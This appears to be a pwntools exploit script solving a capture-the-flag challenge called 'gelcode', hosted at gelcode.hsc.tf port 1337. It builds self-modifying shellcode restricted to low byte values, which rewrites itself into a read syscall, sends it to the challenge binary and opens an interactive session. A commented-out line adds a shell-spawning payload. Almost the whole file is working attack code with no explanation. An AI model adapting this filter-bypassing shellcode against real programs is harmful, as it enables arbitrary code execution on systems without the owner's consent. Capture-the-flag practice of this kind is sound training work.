from pwn import *

e = ELF("./chal")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p, "b *main+255")

if is_remote:
  p = remote("gelcode.hsc.tf", 1337)
else:
  p = process(e.path)
  #, env={"LD_PRELOAD": libc.path})


#debug()

target = asm("xor rax, rax\nmov rsi, rdx\nmov rdx, 0xf00")
if len(target) % 2 != 0:
  target += "\x0f"

todo = []
for i in range(len(target)):
  todo.append((ord(target[i]), i))

todo.sort(key=lambda x: -x[0])
print("todo: %d" % len(todo))

reg = "rdx"

tmp = ""
idx = len(target) - 1
curr = 0xff
for x in todo:
  tmp += (curr - x[0]) * asm("add cl, [%s]" % reg)
  if x[1] < idx:
    tmp += (idx - x[1]) * asm("add al, [%s]" % reg)
  elif x[1] > idx:
    tmp += (x[1] - idx) * asm("add al, 1")

  tmp += asm("or [rdx+rax*1], cl")

  curr = x[0]
  idx = x[1]
  

pay = (
"\x0f\x0d\x00" # prefetch
+ "\x00\x02" # add [rdx], al
+ asm("add al, 0xf") * (0xff // 0xf)
+ asm("or [%s], al" % reg)
+ asm("or cl, [%s]" % reg)
+ asm("add al, 2") # al = 1
+ asm("add [rdx+rax*1], cl") * (0xd - 2)
+ asm("add al, [%s]" % reg)
+ asm("add eax, DWORD PTR [%s]" % reg)
+ tmp
)

print("len: %d" % len(pay))

for i in pay:
  if ord(i) > 0xf:
    print(hex(ord(i)))

start = 0x2ff - len(target) + 1
print("cnt: %d" % (start - len(pay)))
pay += asm("add al, 1") * ((start - len(pay)) // 2)

pay += "\x00" * len(target) + "\x0d\x06" + asm("syscall")

p.sendafter("please.", pay.ljust(1000, "\x00"))

#p.send("A" * (0x560ce1b3055d   - 0x0000560ce1b30260) + asm(shellcraft.sh()))

p.interactive()
